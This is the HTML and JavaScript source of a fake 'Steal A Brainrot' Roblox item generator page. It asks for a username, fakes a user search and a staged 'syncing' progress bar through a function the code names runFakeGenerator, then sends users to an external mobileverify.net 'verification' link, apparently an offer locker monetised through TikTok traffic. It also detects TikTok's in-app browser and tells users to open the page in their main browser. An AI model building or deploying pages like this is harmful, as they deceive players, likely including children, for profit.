

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steal A Brainrot</title>
    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One:wght@400&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    
    <script type="text/javascript" id="ogjs" src="https://mobileverify.net/cl/js/dv6g5o"></script>

    <style>
        /* --- Base & Body Styles --- */
        html, body {
            max-width: 100vw;
            overflow-x: hidden;
            background: #F5E8B9; /* Changed to the color from your image */
            min-height: 100vh;
            font-family: 'Fredoka One', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 1rem;}
        header { text-align: center; margin-bottom: 3rem; margin-top: 2rem; }
        #digital-countdown {
            font-family:'Fredoka One',monospace; font-size:2rem; font-weight:bold; letter-spacing:0.1em;
            background:#e100ff; padding:0.2em 0.7em; border-radius:1.2em; border:2.5px solid #000;
            box-shadow:0 2px 8px #0008; margin-top:0.5rem; color:#FFFFFF;
            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
        }

        /* --- Rainbow Banner --- */
        @keyframes legendary-rainbow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .rainbow-banner {
            background: linear-gradient(90deg, #8C32FF, #DA2FFF, #A34EFF, #FF4C4C, #1D9BF0, #00D26A);
            background-size: 400% 400%; animation: legendary-rainbow 6s linear infinite;
            border-radius: 1.5rem; padding: 0.75rem 2.5rem; display: inline-block; box-shadow: 0 2px 12px #0002;
        }
        .rainbow-banner-text { color: #ffffff; font-family: 'Fredoka One', cursive; font-size: 1.5rem; font-weight: bold; letter-spacing: 1px; text-shadow: 0 2px 8px #0008; }
        
        /* --- Item Grid & Cards --- */
        .list-container {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 20px; padding: 0; list-style: none; max-width: 1000px; margin: 2rem auto 0 auto;
        }
        .pet-row {
            background: #424242; /* Darkened card background to fit theme */
            border: 4px solid #fff; border-radius: 18px; padding: 14px 10px;
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2); display: flex; flex-direction: column;
            align-items: center; text-align: center; gap: 10px;
            transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease, background 0.2s;
            cursor: pointer; 
        }
        .pet-row:hover { background: #A34EFF; transform: translateY(-5px); }
        .pet-row.selected {
            background: #A34EFF; border-color: #f6e05e; 
            transform: scale(1.05) translateY(-5px);
            box-shadow: 0 0 25px rgba(246, 224, 94, 0.7);
        }
        .pet-row .pet-img-bg { position: relative; margin: 0; background: none; box-shadow: none; border: none; width: 100%; height: auto; }
        .pet-row .pet-img-bg img { width: 90%; max-width: 120px; height: auto; object-fit: contain; }
        .pet-row .pet-title {
            margin: 0; font-size: 1.1rem; line-height: 1.2; color: white;
            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
        }

        /* --- Floating Continue Button --- */
        #continue-button {
            display: none; position: fixed; bottom: 30px; left: 50%;
            transform: translateX(-50%); z-index: 1000;
            background: linear-gradient(90deg, #FF4C4C 0%, #FF6B6B 100%);
            color: #ffffff; font-family: 'Fredoka One', cursive; font-size: 1.5rem;
            border: 3px solid #000; border-radius: 18px; padding: 16px 40px;
            cursor: pointer; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
            font-weight: bold; letter-spacing: 1px; transition: transform 0.2s, opacity 0.3s;
        }
        #continue-button:hover { transform: translateX(-50%) scale(1.05); }
        
        /* --- Modals --- */
        .modal-backdrop {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px); z-index: 2000; display: none; align-items: center; justify-content: center;
        }
        .modal-content-wrapper {
            background: linear-gradient(135deg, #1D9BF0 0%, #A34EFF 100%); border-radius: 24px;
            box-shadow: 0 8px 32px 0 #0003; padding: 38px 32px 32px 32px;
            width: 90%; max-width: 400px; text-align: center; position: relative;
            border: 3px solid #222; display: flex; flex-direction: column; align-items: center;
        }
        .modal-title { font-family: 'Fredoka One', cursive; font-size: 2rem; color: #ffffff; margin-bottom: 10px; text-shadow: 2px 2px 0 #000; font-weight: bold; }
        .modal-sub { font-family: 'Fredoka One', cursive; font-size: 1.15rem; color: #ffffff; margin-bottom: 18px; }
        .modal-input {
            width: 100%; padding: 14px 18px; border-radius: 10px; border: 3px solid #222;
            font-size: 1.2rem; margin-bottom: 18px; outline: none; font-family: 'Fredoka One', cursive;
            background: #1A1A2E; color: #ffffff; box-sizing: border-box; transition: border 0.2s;
        }
        .modal-input:focus { border: 3px solid #43d13b; }
        .input-container { display: flex; gap: 10px; margin-bottom: 18px; width: 100%; }
        .input-container input { flex-grow: 1; }
        #roblox-user-search {
            padding: 14px 18px; background: #43d13b; color: white;
            border: 3px solid #222; border-radius: 10px; font-family: 'Fredoka One', cursive; font-size: 1.1rem; cursor: pointer;
        }
        #user-search-results {
            display: none; text-align: center; background: rgba(0,0,0,0.2);
            border-radius: 10px; padding: 15px; margin-bottom: 18px; min-height: 70px;
            justify-content: center; display: flex; flex-direction: column;
        }
        #user-search-results p { margin: 5px 0 0 0; font-size: 1rem; color: white; }
        #user-search-status { font-size: 1.1rem; color: #f6e05e; font-weight: bold; }
        .modal-btn {
            background: linear-gradient(90deg, #FF4C4C 0%, #FF6B6B 100%);
            color: #ffffff; font-family: 'Fredoka One', cursive; font-size: 1.3rem; border: none;
            border-radius: 18px; padding: 16px 0; cursor: pointer; box-shadow: 0 4px 16px #FF4C4C33;
            width: 100%; font-weight: bold; letter-spacing: 1px;
            outline: none; border: 3px solid #222; transition: background 0.2s, transform 0.2s;
        }
        .modal-btn:hover { background: linear-gradient(90deg, #FF6B6B 0%, #FF4C4C 100%); transform: scale(1.03); }
        .modal-close { position: absolute; top: 12px; right: 18px; background: none; border: none; font-size: 1.5rem; color: #ffffff; cursor: pointer; font-weight: bold; z-index: 2; }
        
        #generator-modal .modal-content-wrapper { background: linear-gradient(135deg, #1D9BF0 60%, #A34EFF 100%); border: 4px solid #000; }
        #loading-items-container {
            display: flex; justify-content: center; align-items: center;
            gap: 10px; margin: 10px auto 1.5rem auto; min-height: 80px;
        }
        #loading-items-container img {
            width: 70px; height: 70px; object-fit: contain;
            background: rgba(255,255,255,0.8); border-radius: 1rem;
            border: 2px solid #fff; padding: 5px;
        }
        .progress-bar { background: #fff; border-radius: 1rem; border: 2px solid #a0ff73; overflow: hidden; height: 1.5rem; margin-bottom: 1rem; width: 100%; }
        #progress-fill {
            background: #FF4C4C; color: #ffffff; font-weight: bold; font-family: 'Fredoka One', cursive; font-size: 1.1rem;
            border-radius: 1rem; height: 100%; display: flex; align-items: center; justify-content: center;
            transition: width 0.4s cubic-bezier(.4,2,.6,1); letter-spacing: 1px;
        }
        #game-tip { color: #f0f0f0; font-size: 1.1rem; margin-bottom: 1.2rem; }
        #verify-btn { display:none; }

        /* --- Mobile-Specific Styles --- */
        @media (max-width: 767px) {
            .list-container {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }
        }
    </style>
    
    <style>
        .tiktok-view-active {
            background: none !important;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .popup {
            position: absolute;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 350px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            font-size: 18px;
            line-height: 1.4;
            color: #333;
            font-family: 'Poppins', sans-serif;
        }
        .popup::after {
            content: '';
            position: absolute;
            top: -10px;
            right: 10px;
            width: 0;
            height: 0;
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-bottom: 15px solid white;
        }
        .tiktok-icon {
            display: inline-block;
            width: 25px;
            height: 25px;
            background-image: url('images/tiktokicon.webp'); /* Make sure this image exists */
            background-size: 80%;
            background-position: center;
            background-repeat: no-repeat;
            border-radius: 50%;
            margin: 0 5px;
            vertical-align: middle;
            border: 1px solid #ddd;
        }
        .three-dots {
            display: inline-block;
            width: 25px;
            height: 25px;
            background: #666;
            border-radius: 50%;
            margin: 0 5px;
            position: relative;
            vertical-align: middle;
        }
        .three-dots::after {
            content: '⋯';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 14px;
            font-weight: bold;
        }
        .highlight {
            color: rgb(0,122,255);
            font-weight: bold;
        }
    </style>
</head>
<body>
    
    <div id="ios-popup" style="display:none">
        <div class="popup">
            To continue, please open this page in your main browser (Safari, Chrome, etc).<br><br>
            In <span class="tiktok-icon"></span> TikTok, tap the <span class="three-dots"></span> icon and then select <span class="highlight">"Open in browser"</span>.
        </div>
    </div>

    <div id="normal-page" style="display:none;">
        <div class="container">
            <header>
                <div id="digital-countdown">Steal A Brainrot</div>
            </header>
            <section id="pets">
                <div style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
                    <div class="rainbow-banner">
                        <span class="rainbow-banner-text">ALL BRAINROT</span>
                    </div>
                </div>
                <ul class="list-container">
                <li class="pet-row" data-item-name="GARAMA AND MADUNDUNG"><div class="pet-img-bg"><img src="images/Sh9PuqZx5DF7j73KDJdHxCNjjHS0GAHBFlF3jvBn.png" alt="Garama and Madundung"></div><span class="pet-title">GARAMA AND MADUNDUNG</span></li>
                 <li class="pet-row" data-item-name="Los Matteos"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/7/76/Los_Matteos.png" alt="Los Matteos"></div><span class="pet-title">Los Matteos</span></li>
                  <li class="pet-row" data-item-name="Job Job Job Sahur"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/5/56/JobJobJobSahurVIPXRD.png" alt="Job Job Job Sahur"></div><span class="pet-title">Job Job Job Sahur</span></li>
                  <li class="pet-row" data-item-name="Tralalita Tralala"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-d1598685763d4b64d75b126256b90cd6/420/420/WaistAccessory/Webp/noFilter" alt="Tralalita Tralala"></div><span class="pet-title">Tralalita Tralala</span></li>
                  <li class="pet-row" data-item-name="Urubini Flamenguini"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/f/f2/Flamengo%28%3F%29.png" alt="Urubini Flamenguini"></div><span class="pet-title">Urubini Flamenguini</span></li>
                  <li class="pet-row" data-item-name="Nooo My Hotspot"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/a/a3/Nooo_My_Hotspot%28v2%29.png" alt="Nooo My Hotspot"></div><span class="pet-title">Nooo My Hotspot</span></li>
                  <li class="pet-row" data-item-name="Chimpanzini Spiderini"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/b/bd/Chimpanzini_Spiderini_%28Steal_a_Brainrot%29.webp" alt="Chimpanzini Spiderini"></div><span class="pet-title">Chimpanzini Spiderini</span></li>
                    <li class="pet-row" data-item-name="Tipi Topi Taco"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/7/72/Tipi_Topi_Taco.png" alt="Tipi Topi Taco"></div><span class="pet-title">Tipi Topi Taco</span></li>
                     <li class="pet-row" data-item-name="Bombardini Tortinii"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/4/44/Bombardini_Tortinii.png" alt="Bombardini Tortinii"></div><span class="pet-title">Bombardini Tortinii</span></li>
                      <li class="pet-row" data-item-name="Espresso Signora"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/3/38/Espresso_Signora_%28Steal_a_Brainrot%29.webp" alt="Espresso Signora"></div><span class="pet-title">Espresso Signora</span></li>
                       <li class="pet-row" data-item-name="Uncilto Samito"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/e/ea/Unclito-Samito.png" alt="Uncilto Samito"></div><span class="pet-title">Uncilto Samito</span></li>
                        <li class="pet-row" data-item-name="Statutino Libertino"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/e/ee/Statutino_Libertino_%28Steal_a_Brainrot%29.webp" alt="Statutino Libertino"></div><span class="pet-title">Statutino Libertino</span></li>
                         <li class="pet-row" data-item-name="Matteo"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/6/6e/Matteo_%28Steal_a_Brainrot%29.webp" alt="Matteo"></div><span class="pet-title">Matteo</span></li>
                         <li class="pet-row" data-item-name="Los Hotspotsitos"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/9/95/Los_Hotspotsitos2.png" alt="Los Hotspotsitos"></div><span class="pet-title">Los Hotspotsitos</span></li>
                         <li class="pet-row" data-item-name="Karkerkar kurkur"><div class="pet-img-bg"><img src="images/Karkerkarkurkur.png" alt="Karkerkar kurkur"></div><span class="pet-title">Karkerkar kurkur</span></li>
                         <li class="pet-row" data-item-name="dragon cannelloni"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-b14aa19aee59dcd2e3fdc474bc8ed42e/420/420/Hat/Webp/noFilter" alt="dragon cannelloni"></div><span class="pet-title">dragon cannelloni</span></li>
                         <li class="pet-row" data-item-name="Esok Sekolah"><div class="pet-img-bg"><img src="images/esok-removebg-preview.png" alt="Esok Sekolah"></div><span class="pet-title">Esok Sekolah</span></li>
                         <li class="pet-row" data-item-name="Los Combinasionas"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-a06c75cf7c357e4e5ac2ce5b7192268d/420/420/BackAccessory/Webp/noFilter" alt="Los Combinasionas"></div><span class="pet-title">Los Combinasionas</span></li>
                         <li class="pet-row" data-item-name="La Grande Combinasion"><div class="pet-img-bg"><img src="https://static.wikia.nocookie.net/stealabr/images/f/fc/La_Grande_Combinasion_%28Steal_a_Brainrot%29.webp" alt="La Grande Combinasion"></div><span class="pet-title">La Grande Combinasion</span></li>
                         <li class="pet-row" data-item-name="Trippi Troppi Troppa Trippa"><div class="pet-img-bg"><img src="images/Trippi_Troppi_Troppa_Trippa.webp" alt="Trippi Troppi Troppa Trippa"></div><span class="pet-title">Trippi Troppi Troppa Trippa</span></li>
                         <li class="pet-row" data-item-name="Secret Lucky Block"><div class="pet-img-bg"><img src="images/Secret_Lucky_Block_%28Steal_a_Brainrot%29.webp" alt="Secret Lucky Block"></div><span class="pet-title">Secret Lucky Block</span></li>
                         <li class="pet-row" data-item-name="Chicleteira Bicicleteira"><div class="pet-img-bg"><img src="images/Chicleteira-Bicicleteira.png" alt="Chicleteira Bicicleteira"></div><span class="pet-title">Chicleteira Bicicleteira</span></li>
                         <li class="pet-row" data-item-name="Agarrini La Palini"><div class="pet-img-bg"><img src="images/Agarrini_La_Palini.webp" alt="Agarrini La Palini"></div><span class="pet-title">Agarrini La Palini</span></li>
                         <li class="pet-row" data-item-name="Rainbow Odin Din Din Dun"><div class="pet-img-bg"><img src="images/all_server_rainbow_odin_din_din_dun.png" alt="Rainbow Odin Din Din Dun"></div><span class="pet-title">Rainbow Odin Din Din Dun</span></li>
                         <li class="pet-row" data-item-name="Rainbow Graipuss Medussi"><div class="pet-img-bg"><img src="images/rainbow.png" alt="Rainbow Graipuss Medussi"></div><span class="pet-title">Rainbow Graipuss Medussi</span></li>
                         <li class="pet-row" data-item-name="Rainbow Tralalero Tralala"><div class="pet-img-bg"><img src="images/all_server_rainbow_tralalero_tralala.png" alt="Rainbow Tralalero Tralala"></div><span class="pet-title">Rainbow Tralalero Tralala</span></li>
                         <li class="pet-row" data-item-name="LOS TRALALERITOS"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-26182675b92f2ad9a61ecae30a2b8ead/420/420/BackAccessory/Webp/noFilter" alt="LOS TRALALERITOS"></div><span class="pet-title">LOS TRALALERITOS</span></li>
                         <li class="pet-row" data-item-name="LAS TRALALERITAS"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-08e3120deac49b7bc1227de3932b255c/420/420/Hat/Webp/noFilter" alt="Las Tralaleritas"></div><span class="pet-title">LAS TRALALERITAS</span></li>
                         <li class="pet-row" data-item-name="TRALALERO TRALALA LAVA"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-13af1b4d458233fb3fb4aa49a7ee5520/420/420/WaistAccessory/Webp/noFilter" alt="Tralalero Tralala Lava"></div><span class="pet-title">TRALALERO TRALALA LAVA</span></li>
                         <li class="pet-row" data-item-name="COCOFANTO ELEFANTO"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-308310f72b54e617e6039983ffa8987e/420/420/LayeredAccessory/Webp/noFilter" alt="Cocofanto Elefanto"></div><span class="pet-title">COCOFANTO ELEFANTO</span></li>
                         <li class="pet-row" data-item-name="BALLERINO LOLOLO"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-8722139c40ed43ae6cb73b046062ba7f/420/420/Hat/Webp/noFilter" alt="Ballerino Lololo"></div><span class="pet-title">BALLERINO LOLOLO</span></li>
                         <li class="pet-row" data-item-name="LA VACCA SATURNO SATURNITA"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-038dd6b56d93422289d07f8f3764d75d/420/420/JacketAccessory/Webp/noFilter" alt="La Vacca Saturno Saturnita"></div><span class="pet-title">LA VACCA SATURNO SATURNITA</span></li>
                         <li class="pet-row" data-item-name="NUCLEARO DINOSSAURO"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-b87295a7d3ed3eb3f8560bb3af747093/420/420/Hat/Webp/noFilter" alt="Nuclearo Dinossauro"></div><span class="pet-title">NUCLEARO DINOSSAURO</span></li>
                         <li class="pet-row" data-item-name="TORRTUGINNI DRAGONFRUTINI"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-f4e2a91bab54e236f94b196b48dcdb12/420/420/LayeredAccessory/Png/noFilter" alt="Torrtuginni Dragonfrutini"></div><span class="pet-title">TORRTUGINNI DRAGONFRUTINI</span></li>
                         <li class="pet-row" data-item-name="POT HOTSPOT"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-13ef80ef66437af24e15e6f99fde37e0/420/420/LayeredAccessory/Webp/noFilter" alt="Pot Hotspoto"></div><span class="pet-title">POT HOTSPOT</span></li>
                         <li class="pet-row" data-item-name="ODIN DIN DIN DUN"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-f34b12c0edcb4df38be51c74445b3b93/420/420/LayeredAccessory/Webp/noFilter" alt="Odin Din Din Dun"></div><span class="pet-title">ODIN DIN DIN DUN</span></li>
                         <li class="pet-row" data-item-name="GRAIPUSS MEDUSSI"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-b4771e0464cf7ec27ce1e34803021996/420/420/LayeredAccessory/Webp/noFilter" alt="Graipuss Medussi"></div><span class="pet-title">GRAIPUSS MEDUSSI</span></li>
                         <li class="pet-row" data-item-name="BRAINROT NUCLEARO DINOSSAURO"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-57fa46e1fdc1ef36467bd6c630058ad3/420/420/JacketAccessory/Webp/noFilter" alt="Brainrot Nuclearo Dinossauro"></div><span class="pet-title">BRAINROT NUCLEARO DINOSSAURO</span></li>                         
                         <li class="pet-row" data-item-name="DRAGON CANNELLONI"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-b14aa19aee59dcd2e3fdc474bc8ed42e/420/420/Hat/Webp/noFilter" alt="Dragon Cannelloni"></div><span class="pet-title">DRAGON CANNELLONI</span></li>
                         <li class="pet-row" data-item-name="LA GRANDE"><div class="pet-img-bg"><img src="https://tr.rbxcdn.com/180DAY-f1a032865ad977022eedb4accebdc3df/420/420/LayeredAccessory/Webp/noFilter" alt="La Grande"></div><span class="pet-title">LA GRANDE</span></li>
                </ul>
            </section>
        </div>
        <button id="continue-button">Continue</button>
    </div>
    
    <div id="username-modal" class="modal-backdrop">
      <div class="modal-content-wrapper">
        <button id="username-modal-close" class="modal-close">✖</button>
        <div class="modal-title">Find Your Account</div>
        <div class="modal-sub">Enter your Roblox username.</div>
        <div class="input-container">
            <input class="modal-input" id="username-modal-input" placeholder="Your Username" type="text">
            <button id="roblox-user-search">Search</button>
        </div>
        <div id="user-search-results">
            <div id="user-search-status"></div>
            <p id="user-id-display"></p>
        </div>
        <button class="modal-btn" id="claim-button">Claim For This User</button>
      </div>
    </div>

    <div id="generator-modal" class="modal-backdrop">
        <div class="modal-content-wrapper">
            <div id="generator-title" class="modal-title">Initializing...</div>
            <div id="loading-items-container"></div>
            <div class="progress-bar">
                <div id="progress-fill" style="width:0%">0%</div>
            </div>
            <div id="game-tip" class="modal-sub"></div>
            <button class="modal-btn" id="verify-btn" style="display:none;" 
onclick="window.location.href='https://mobileverify.net/cl/j/dv6dmw?pubid=367669&subid=tiktok';">
  Verify
</button>

        </div>
    </div>

    <script>
    $(document).ready(function() {
        const MAX_SELECTIONS = 3;

        $('.pet-row').on('click', function() {
            if ($(this).hasClass('selected')) {
                $(this).removeClass('selected');
            } else if ($('.pet-row.selected').length < MAX_SELECTIONS) {
                $(this).addClass('selected');
            } else {
                alert(`You can only select up to ${MAX_SELECTIONS} items.`);
            }
            if ($('.pet-row.selected').length > 0) {
                $('#continue-button').fadeIn();
            } else {
                $('#continue-button').fadeOut();
            }
        });
        
        $('#continue-button').on('click', function() { openUsernameModal(); });

        const $usernameModal = $('#username-modal');
        const $searchButton = $('#roblox-user-search');
        const $usernameInput = $('#username-modal-input');
        const $resultsDiv = $('#user-search-results');
        const $statusDiv = $('#user-search-status');
        const $userIdDisplay = $('#user-id-display');
        const $claimButton = $('#claim-button');

        function openUsernameModal() {
            $usernameModal.css('display', 'flex');
            $usernameInput.val('').focus();
            $resultsDiv.hide();
            $claimButton.hide();
        }

        function closeUsernameModal() { $usernameModal.hide(); }

        $('#username-modal-close').on('click', closeUsernameModal);
        
        $searchButton.on('click', function() {
            const username = $usernameInput.val().trim();
            if (!username) {
                alert('Please enter a username.');
                return;
            }

            $resultsDiv.css('display', 'flex');
            $claimButton.hide();
            $userIdDisplay.text('');
            $statusDiv.text('Searching...');
            $searchButton.prop('disabled', true);

            setTimeout(() => { 
                $statusDiv.text('User Found!');
                $userIdDisplay.text(`Username: ${username}`);
                $claimButton.show();
                $searchButton.prop('disabled', false);
            }, 1500);
        });

        $claimButton.on('click', function() {
            const username = $usernameInput.val().trim();
            if (username) {
                closeUsernameModal();
                const selectedImages = $('.pet-row.selected').map(function() {
                    return $(this).find('img').attr('src');
                }).get();
                runFakeGenerator(username, selectedImages);
            }
        });

        // --- MODIFIED CODE STARTS HERE ---
        async function runFakeGenerator(username, selectedImageUrls) {
            const $generatorModal = $('#generator-modal');
            const $progressFill = $('#progress-fill');
            const $verifyBtn = $('#verify-btn');
            const $gameTip = $('#game-tip');
            const $generatorTitle = $('#generator-title');
            const $loadingItemsContainer = $('#loading-items-container');

            // --- Initial Setup ---
            $generatorModal.css('display', 'flex');
            $progressFill.css('width', "0%").text("0%");
            $verifyBtn.hide();
            
            $loadingItemsContainer.empty();
            if (selectedImageUrls && selectedImageUrls.length > 0) {
                selectedImageUrls.forEach(url => {
                    $loadingItemsContainer.append($('<img>', { src: url }));
                });
            }
            
            // Helper function for smooth progress updates
            function updateProgress(percentage, text) {
                $progressFill.css('width', percentage + "%").text(text || (percentage + "%"));
            }

            // --- Stage 1: Connecting ---
            $generatorTitle.text("Connecting to Game Server...");
            $gameTip.text("Initializing secure connection, please wait.");
            await new Promise(r => setTimeout(r, 1500)); // Delay 1.5s
            updateProgress(20, "Connecting...");

            // --- Stage 2: Authenticating ---
            await new Promise(r => setTimeout(r, 500));
            $generatorTitle.text(`Authenticating User: ${username}`);
            $gameTip.text("Verifying account details with game database.");
            await new Promise(r => setTimeout(r, 2000)); // Delay 2s
            updateProgress(45, "Authenticated");

            // --- Stage 3: Preparing Items ---
            await new Promise(r => setTimeout(r, 500));
            const itemText = selectedImageUrls.length > 1 ? "items" : "item";
            $generatorTitle.text(`Processing ${selectedImageUrls.length} ${itemText}`);
            $gameTip.text("Allocating selected items from server-side inventory.");
            await new Promise(r => setTimeout(r, 1800)); // Delay 1.8s
            updateProgress(70, "Items Prepared");

            // --- Stage 4: Syncing and Finalization (Smooth Animation) ---
            await new Promise(r => setTimeout(r, 800));
            $generatorTitle.text("Syncing Items with Your Account...");
            $gameTip.text("This is the final step. Do not refresh or close the page.");

            let currentProgress = 70;
            const syncInterval = setInterval(() => {
                currentProgress += 1;
                if (currentProgress >= 99) {
                    clearInterval(syncInterval);
                    currentProgress = 99; // Cap at 99% before verification
                }
                updateProgress(currentProgress, `Syncing... ${currentProgress}%`);
            }, 80); // Update every 80ms. ~2.3 seconds total for this stage

            // Wait for the interval to finish
            await new Promise(r => setTimeout(r, 2500));

            // --- Stage 5: Awaiting Verification ---
            updateProgress(100, "Sync Complete!");
            await new Promise(r => setTimeout(r, 500));
            $generatorTitle.text("Verification Required");
            $gameTip.text("To prevent abuse, please complete one final step to receive your items.");
            $verifyBtn.fadeIn(); // Use fadeIn for a smoother appearance
        }
        // --- MODIFIED CODE ENDS HERE ---
    });
    </script>
    
    <script>
        function isTikTokBrowser() {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
            return (userAgent.includes('musical_ly_') || userAgent.includes('Aweme') || userAgent.includes('tiktok') || (userAgent.includes('iPhone') && userAgent.includes('ByteLocale') && userAgent.includes('JsSdk/2.0')));
        }

        if (isTikTokBrowser()) {
            document.getElementById('ios-popup').style.display = 'block';
            document.body.classList.add('tiktok-view-active');
        } else {
            document.getElementById('normal-page').style.display = 'block';
        }
    </script>
</body>
</html>

